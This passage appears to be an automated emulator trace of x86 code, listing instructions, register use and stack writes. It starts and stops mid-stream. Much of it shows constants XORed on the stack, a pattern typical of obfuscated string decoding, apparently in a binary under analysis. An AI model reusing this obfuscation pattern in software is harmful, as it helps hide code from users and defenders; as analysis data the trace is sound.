0x54e7e0d0, regs_read: (), regs_write: [29] 0x45941f: mov dword ptr [esp + 0x98], 0x3707ab31, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8098 for stack size 0x10000 saving data to stack: 923249457 4 0x45942a: mov dword ptr [esp + 0x90], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x6c and offset 0x8090 for stack size 0x10000 saving data to stack: 1424482512 4 0x459438: mov dword ptr [esp + 0x9c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x6c and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45943f: movaps xmm1, xmmword ptr [esp + 0x90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x6c and offset 0x8090 for stack size 0x10000 0x459447: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x45944f: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459457: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45945f: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x6c and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459463: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x6c and offset 0x8010 for stack size 0x10000 0x459469: push eax, regs_read: [30, 19], regs_write: [30] 0x45946a: movaps xmmword ptr [esp + 0x94], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x70 and offset 0x8094 for stack size 0x10000 saving data to stack: 133460670536089084576756327 16 0x459477: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45947e: mov byte ptr [0x4ebb4e], al, regs_read: [2], regs_write: () 0x459483: mov ecx, 0x4f06a0, regs_read: (), regs_write: [22] 0x459488: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x45948d: mov dword ptr [esp + 0xa0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x70 and offset 0x80a0 for stack size 0x10000 saving data to stack: 1424482512 4 0x459494: mov dword ptr [esp + 0xa8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45949b: mov dword ptr [esp + 0xa4], 0x350e3ab7, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x80a4 for stack size 0x10000 saving data to stack: 890124983 4 0x4594a6: mov dword ptr [esp + 0xac], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x70 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x4594ad: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x70 and offset 0x80a0 for stack size 0x10000 0x4594b5: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x4594c0: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x4594c8: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x4594d0: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x70 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4594d4: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x70 and offset 0x8010 for stack size 0x10000 0x4594da: push eax, regs_read: [30, 19], regs_write: [30] 0x4594db: movaps xmmword ptr [esp + 0xa4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x74 and offset 0x80a4 for stack size 0x10000 saving data to stack: 29119875622466151 16 0x4594e8: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4594ef: mov byte ptr [0x4ebb54], al, regs_read: [2], regs_write: () 0x4594f4: mov ecx, 0x4f06a0, regs_read: (), regs_write: [22] 0x4594f9: mov eax, 0x3769ce54, regs_read: (), regs_write: [19] 0x4594fe: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459506: mov dword ptr [esp + 0x18], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x74 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45950a: mov dword ptr [esp + 0xb8], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x74 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x459518: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459520: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x74 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459524: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x74 and offset 0x8010 for stack size 0x10000 0x459529: mov dword ptr [esp + 0xb0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x74 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1424482512 4 0x459530: mov dword ptr [esp + 0xb4], 0x351a2ab7, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x80b4 for stack size 0x10000 saving data to stack: 890907319 4 0x45953b: mov dword ptr [esp + 0xbc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x74 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x459542: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x74 and offset 0x80b0 for stack size 0x10000 0x45954b: push eax, regs_read: [30, 19], regs_write: [30] 0x45954c: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x78 and offset 0x80b4 for stack size 0x10000 saving data to stack: 32479983156949607 16 0x459559: mov ecx, eax, regs_read: [19], regs_write: [22] 0x459560: mov dword ptr [esp + 0xc0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x78 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1424482512 4 0x459567: mov ecx, 0x4f06a0, regs_read: (), regs_write: [22] 0x45956c: mov dword ptr [esp + 0xc4], 0x590839b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80c4 for stack size 0x10000 saving data to stack: 1493711287 4 0x459577: mov dword ptr [esp + 0xc8], 0x441dab38, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x80c8 for stack size 0x10000 saving data to stack: 1142795064 4 0x459582: mov dword ptr [esp + 0xcc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x78 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x459589: movaps xmm1, xmmword ptr [esp + 0xc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x80c0 for stack size 0x10000 0x459591: mov byte ptr [0x4ebb4d], al, regs_read: [2], regs_write: () 0x45959d: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x4595a5: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x4595ad: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x78 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x4595b5: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x78 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4595b9: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x78 and offset 0x8010 for stack size 0x10000 0x4595bf: push eax, regs_read: [30, 19], regs_write: [30] 0x4595c0: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x7c and offset 0x80c4 for stack size 0x10000 saving data to stack: 35731490483602764162807198311 16 0x4595cd: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4595d4: mov byte ptr [0x4ebb4c], al, regs_read: [2], regs_write: () 0x4595d9: mov dword ptr [esp + 0xd0], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x7c and offset 0x80d0 for stack size 0x10000 saving data to stack: 1424482512 4 0x4595e0: mov dword ptr [esp + 0xd4], 0x5c0127b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80d4 for stack size 0x10000 saving data to stack: 1543579575 4 0x4595eb: mov dword ptr [esp + 0xd8], 0x4506ba27, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80d8 for stack size 0x10000 saving data to stack: 1158068775 4 0x4595f6: mov dword ptr [esp + 0xdc], 0x52cae0ec, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x80dc for stack size 0x10000 saving data to stack: 1389027564 4 0x459601: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459609: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x459611: movaps xmm1, xmmword ptr [esp + 0xd0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x80d0 for stack size 0x10000 0x459620: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x459628: mov ecx, 0x4f06a0, regs_read: (), regs_write: [22] 0x45962d: mov dword ptr [esp + 0x1c], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x7c and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459631: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x8010 for stack size 0x10000 0x459637: push eax, regs_read: [30, 19], regs_write: [30] 0x459638: movaps xmmword ptr [esp + 0xd4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x80 and offset 0x80d4 for stack size 0x10000 saving data to stack: 9622023696035078428477232345703 16 0x459645: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45964c: mov byte ptr [0x4ebb4f], al, regs_read: [2], regs_write: () 0x45965b: mov ecx, 0x4f0628, regs_read: (), regs_write: [22] 0x459665: mov ecx, 0x4f0704, regs_read: (), regs_write: [22] 0x45966f: mov edi, dword ptr [0x4c80a0], regs_read: (), regs_write: [23] 0x459677: push eax, regs_read: [30, 19], regs_write: [30] 0x459678: push eax, regs_read: [30, 19], regs_write: [30] 0x459679: push eax, regs_read: [30, 19], regs_write: [30] 0x45967a: push 0x46b12f, regs_read: [30], regs_write: [30] 0x45967f: push eax, regs_read: [30, 19], regs_write: [30] 0x459680: push eax, regs_read: [30, 19], regs_write: [30] 0x459683: mov dword ptr [esp + 0x30], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x98 and offset 0x8030 for stack size 0x10000 saving data to stack: 929680980 4 0x459689: push eax, regs_read: [30, 19], regs_write: [30] 0x45968a: push eax, regs_read: [30, 19], regs_write: [30] 0x45968b: push eax, regs_read: [30, 19], regs_write: [30] 0x45968c: push 0x461425, regs_read: [30], regs_write: [30] 0x459691: push eax, regs_read: [30, 19], regs_write: [30] 0x459692: push eax, regs_read: [30, 19], regs_write: [30] 0x459695: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xb0 and offset 0x802c for stack size 0x10000 saving data to stack: 929680980 4 0x45969b: push eax, regs_read: [30, 19], regs_write: [30] 0x45969c: push eax, regs_read: [30, 19], regs_write: [30] 0x45969d: push eax, regs_read: [30, 19], regs_write: [30] 0x45969e: push 0x460f16, regs_read: [30], regs_write: [30] 0x4596a3: push eax, regs_read: [30, 19], regs_write: [30] 0x4596a4: push eax, regs_read: [30, 19], regs_write: [30] 0x4596a7: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x4596c4: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x4596c9: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x4596d1: mov dword ptr [esp + 0x1c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4596d8: mov dword ptr [esp + 0x24], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x4596e0: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0xc8 and offset 0x8000 for stack size 0x10000 0x4596e2: mov dword ptr [esp + 0x28], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x4596ea: movaps xmm1, xmmword ptr [esp + 0x20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x8020 for stack size 0x10000 0x4596ef: mov dword ptr [esp + 0xfc], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x80fc for stack size 0x10000 saving data to stack: 1389027477 4 0x4596f6: mov dword ptr [esp + 0xf0], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x80f0 for stack size 0x10000 saving data to stack: 1608646107 4 0x459701: mov dword ptr [esp + 0xf4], 0x35693d86, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x80f4 for stack size 0x10000 saving data to stack: 896089478 4 0x45970c: mov dword ptr [esp + 0xf8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x80f8 for stack size 0x10000 saving data to stack: 929680980 4 0x459717: pxor xmm1, xmmword ptr [esp + 0xf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x80f0 for stack size 0x10000 0x459720: mov dword ptr [esp + 0x10c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x459727: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x459732: movaps xmmword ptr [esp + 0xf0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xc8 and offset 0x80f0 for stack size 0x10000 saving data to stack: 110050094684534569358636731741719625179 16 0x45973a: mov dword ptr [esp + 0x100], 0x5af3f3e1, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8100 for stack size 0x10000 saving data to stack: 1525937121 4 0x459745: mov dword ptr [esp + 0x104], 0x7020119c, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8104 for stack size 0x10000 saving data to stack: 1881149852 4 0x459750: mov dword ptr [esp + 0x108], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45975b: movaps xmm1, xmmword ptr [esp + 0x100], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x8100 for stack size 0x10000 0x459763: mov dword ptr [esp + 0x20], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8020 for stack size 0x10000 saving data to stack: 914789047 4 0x45976b: mov dword ptr [esp + 0x24], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x459773: mov dword ptr [esp + 0x28], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45977b: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xc8 and offset 0x8020 for stack size 0x10000 0x459781: push ecx, regs_read: [30, 22], regs_write: [30] 0x459782: mov ecx, eax, regs_read: [19], regs_write: [22] 0x459784: movaps xmmword ptr [esp + 0x104], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xcc and offset 0x8104 for stack size 0x10000 saving data to stack: 4992626615557382486 16 0x459791: push eax, regs_read: [30, 19], regs_write: [30] 0x459792: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4597a0: mov ecx, 0x4f0720, regs_read: (), regs_write: [22] 0x4597a5: push eax, regs_read: [30, 19], regs_write: [30] 0x4597ab: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4597cf: mov edx, 0x3769ce54, regs_read: (), regs_write: [24] 0x4597d4: mov dword ptr [esp + 0x100], 0x5fe1fddb, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8100 for stack size 0x10000 saving data to stack: 1608646107 4 0x4597df: mov ecx, 0x52cae095, regs_read: (), regs_write: [22] 0x4597e4: mov dword ptr [esp + 0x108], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x4597eb: mov dword ptr [esp + 0x10c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x4597f2: mov esi, 0x84ff9d1e, regs_read: (), regs_write: [29] 0x4597f7: mov dword ptr [esp + 0x1c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4597fe: mov dword ptr [esp + 0x114], 0x35693d86, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8114 for stack size 0x10000 saving data to stack: 896089478 4 0x459809: mov ecx, 0x656c28fb, regs_read: (), regs_write: [22] 0x45980e: movaps xmm1, xmmword ptr [esp + 0x110], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8110 for stack size 0x10000 0x459816: mov dword ptr [esp + 0x28], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45981a: mov edx, 0x22f82a66, regs_read: (), regs_write: [24] 0x45981f: mov dword ptr [esp + 0x20], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8020 for stack size 0x10000 saving data to stack: 914789047 4 0x459827: mov dword ptr [esp + 0x24], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8024 for stack size 0x10000 saving data to stack: 896093928 4 0x45982f: pxor xmm1, xmmword ptr [esp + 0x20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8020 for stack size 0x10000 0x459835: movaps xmmword ptr [esp + 0x110], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8110 for stack size 0x10000 saving data to stack: 112859131976613086555523136456978582979 16 0x45983d: mov dword ptr [esp + 0x150], 0x52e8fbe0, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8150 for stack size 0x10000 saving data to stack: 1391000544 4 0x459848: mov dword ptr [esp + 0x154], 0x761a3987, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8154 for stack size 0x10000 saving data to stack: 1981430151 4 0x459853: mov dword ptr [esp + 0x158], 0x520dab26, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8158 for stack size 0x10000 saving data to stack: 1376627494 4 0x45985e: mov dword ptr [esp + 0x15c], 0x33a394fb, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x815c for stack size 0x10000 saving data to stack: 866358523 4 0x459869: movaps xmm1, xmmword ptr [esp + 0x150], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8150 for stack size 0x10000 0x459871: mov dword ptr [esp + 0x16c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x816c for stack size 0x10000 saving data to stack: 1701587195 4 0x459878: mov dword ptr [esp + 0x190], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8190 for stack size 0x10000 saving data to stack: 914789047 4 0x459883: mov dword ptr [esp + 0x194], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8194 for stack size 0x10000 saving data to stack: 896093928 4 0x45988e: mov dword ptr [esp + 0x198], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8198 for stack size 0x10000 saving data to stack: 929680980 4 0x459899: mov dword ptr [esp + 0x19c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x819c for stack size 0x10000 saving data to stack: 1389027477 4 0x4598a4: pxor xmm1, xmmword ptr [esp + 0x190], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8190 for stack size 0x10000 0x4598ad: mov dword ptr [esp + 0x1ac], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x81ac for stack size 0x10000 saving data to stack: 1701587195 4 0x4598bb: mov dword ptr [esp + 0x164], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8164 for stack size 0x10000 saving data to stack: 2231344414 4 0x4598c2: mov dword ptr [esp + 0x168], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8168 for stack size 0x10000 saving data to stack: 586689126 4 0x4598c9: movaps xmmword ptr [esp + 0x150], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8150 for stack size 0x10000 saving data to stack: 129482668267274254376232568971647150423 16 0x4598d1: mov dword ptr [esp + 0x160], 0x7208b865, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8160 for stack size 0x10000 saving data to stack: 1913174117 4 0x4598dc: movaps xmm1, xmmword ptr [esp + 0x160], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8160 for stack size 0x10000 0x4598e4: mov dword ptr [esp + 0x1a4], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xd4 and offset 0x81a4 for stack size 0x10000 saving data to stack: 2231344414 4 0x4598eb: mov esi, esp, regs_read: [30], regs_write: [29] adjusting stack for ESP -0xd4 and offset 0x8000 for stack size 0x10000 0x4598ed: mov dword ptr [esp + 0x1a8], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd4 and offset 0x81a8 for stack size 0x10000 saving data to stack: 586689126 4 0x4598f4: mov dword ptr [esp + 0x1a0], 0x7208cb09, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x81a0 for stack size 0x10000 saving data to stack: 1913178889 4 0x4598ff: pxor xmm1, xmmword ptr [esp + 0x1a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x81a0 for stack size 0x10000 0x459908: push ecx, regs_read: [30, 22], regs_write: [30] 0x459909: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45990b: movaps xmmword ptr [esp + 0x164], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd8 and offset 0x8164 for stack size 0x10000 saving data to stack: 29548 16 0x459918: push eax, regs_read: [30, 19], regs_write: [30] 0x459919: mov ecx, esi, regs_read: [29], regs_write: [22] 0x459927: mov ecx, 0x4f0720, regs_read: (), regs_write: [22] 0x45992c: push eax, regs_read: [30, 19], regs_write: [30] 0x459932: mov ecx, eax, regs_read: [19], regs_write: [22] 0x459945: mov esi, dword ptr [0x4c81a4], regs_read: (), regs_write: [29] 0x45994b: push -1, regs_read: [30], regs_write: [30] 0x45994d: push dword ptr [esp + 0x34], regs_read: [30], regs_write: [30] 0x459953: push -1, regs_read: [30], regs_write: [30] 0x459955: push dword ptr [esp + 0x30], regs_read: [30], regs_write: [30] 0x45995b: push -1, regs_read: [30], regs_write: [30] 0x45995d: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x459965: push eax, regs_read: [30, 19], regs_write: [30] 0x459966: push eax, regs_read: [30, 19], regs_write: [30] 0x459967: push eax, regs_read: [30, 19], regs_write: [30] 0x459968: push 0x45faf2, regs_read: [30], regs_write: [30] 0x45996d: push eax, regs_read: [30, 19], regs_write: [30] 0x45996e: push eax, regs_read: [30, 19], regs_write: [30] 0x459971: mov dword ptr [esp + 0x30], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x110 and offset 0x8030 for stack size 0x10000 saving data to stack: 929680980 4 0x459977: push eax, regs_read: [30, 19], regs_write: [30] 0x459978: push eax, regs_read: [30, 19], regs_write: [30] 0x459979: push eax, regs_read: [30, 19], regs_write: [30] 0x45997a: push 0x45dd53, regs_read: [30], regs_write: [30] 0x45997f: push eax, regs_read: [30, 19], regs_write: [30] 0x459980: push eax, regs_read: [30, 19], regs_write: [30] 0x459983: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x128 and offset 0x802c for stack size 0x10000 saving data to stack: 929680980 4 0x459989: push eax, regs_read: [30, 19], regs_write: [30] 0x45998a: push eax, regs_read: [30, 19], regs_write: [30] 0x45998b: push eax, regs_read: [30, 19], regs_write: [30] 0x45998c: push 0x45cd57, regs_read: [30], regs_write: [30] 0x459991: push eax, regs_read: [30, 19], regs_write: [30] 0x459992: push eax, regs_read: [30, 19], regs_write: [30] 0x459995: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x140 and offset 0x8028 for stack size 0x10000 saving data to stack: 929680980 4 0x45999b: push eax, regs_read: [30, 19], regs_write: [30] 0x45999c: push eax, regs_read: [30, 19], regs_write: [30] 0x45999d: push eax, regs_read: [30, 19], regs_write: [30] 0x45999e: push 0x45af40, regs_read: [30], regs_write: [30] 0x4599a3: push eax, regs_read: [30, 19], regs_write: [30] 0x4599a4: push eax, regs_read: [30, 19], regs_write: [30] 0x4599a7: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x158 and offset 0x8024 for stack size 0x10000 saving data to stack: 929680980 4 0x4599ad: push eax, regs_read: [30, 19], regs_write: [30] 0x4599ae: push eax, regs_read: [30, 19], regs_write: [30] 0x4599af: push eax, regs_read: [30, 19], regs_write: [30] 0x4599b0: push 0x45af1d, regs_read: [30], regs_write: [30] 0x4599b5: push eax, regs_read: [30, 19], regs_write: [30] 0x4599b6: push eax, regs_read: [30, 19], regs_write: [30] 0x4599b9: mov dword ptr [esp + 0x34], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x170 and offset 0x8034 for stack size 0x10000 saving data to stack: 929680980 4 0x4599bf: push eax, regs_read: [30, 19], regs_write: [30] 0x4599c0: push eax, regs_read: [30, 19], regs_write: [30] 0x4599c1: push eax, regs_read: [30, 19], regs_write: [30] 0x4599c2: push 0x459ed0, regs_read: [30], regs_write: [30] 0x4599c7: push eax, regs_read: [30, 19], regs_write: [30] 0x4599c8: push eax, regs_read: [30, 19], regs_write: [30] 0x4599cb: mov edi, eax, regs_read: [19], regs_write: [23] 0x4599cf: push eax, regs_read: [30, 19], regs_write: [30] 0x4599d0: push eax, regs_read: [30, 19], regs_write: [30] 0x4599d1: push eax, regs_read: [30, 19], regs_write: [30] 0x4599d2: push 0x459d88, regs_read: [30], regs_write: [30] 0x4599d7: push eax, regs_read: [30, 19], regs_write: [30] 0x4599d8: push eax, regs_read: [30, 19], regs_write: [30] 0x4599e2: mov esi, eax, regs_read: [19], regs_write: [29] 0x4599e8: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1a0 and offset 0x8000 for stack size 0x10000 0x4599ea: push eax, regs_read: [30, 19], regs_write: [30] 0x4599fa: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1a4 and offset 0x8000 for stack size 0x10000 0x4599fc: push eax, regs_read: [30, 19], regs_write: [30] 0x459a0c: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1a8 and offset 0x8000 for stack size 0x10000 0x459a0e: push eax, regs_read: [30, 19], regs_write: [30] 0x459a17: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x1ac and offset 0x8000 for stack size 0x10000 0x459a19: push 0x4f05f0, regs_read: [30], regs_write: [30] 0x459a2b: push -1, regs_read: [30], regs_write: [30] 0x459a2d: push dword ptr [esp + 0x34], regs_read: [30], 